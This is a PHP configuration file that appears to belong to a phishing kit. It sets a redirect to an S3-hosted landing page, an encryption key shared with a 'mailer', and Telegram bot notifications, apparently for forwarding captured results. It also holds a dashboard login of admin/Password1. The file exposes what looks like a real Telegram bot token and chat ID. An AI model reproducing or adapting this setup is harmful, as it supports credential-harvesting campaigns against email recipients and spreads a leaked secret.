<?php
// config.php

$redirect_base = "https://a0we2e4b46fa88f.s3.us-east-1.amazonaws.com/index.html#";

// Encryption key (must match the one used in your mailer)
$secret_key = "CHANGE_THIS_TO_A_LONG_RANDOM_SECRET";

// ========== Notification Settings ==========
$enable_email_notify   = false;
$notify_email          = "";

$enable_telegram_notify = true;
$telegram_bot_token    = "8667043383:AAFKzpCGjq94dFp_rZwLVl_csWOPP54Wefk";
$telegram_chat_id      = "-1003519351997";

// ========== Dashboard Login ==========
$dashboard_user = "admin";
$dashboard_pass = "Password1";
?>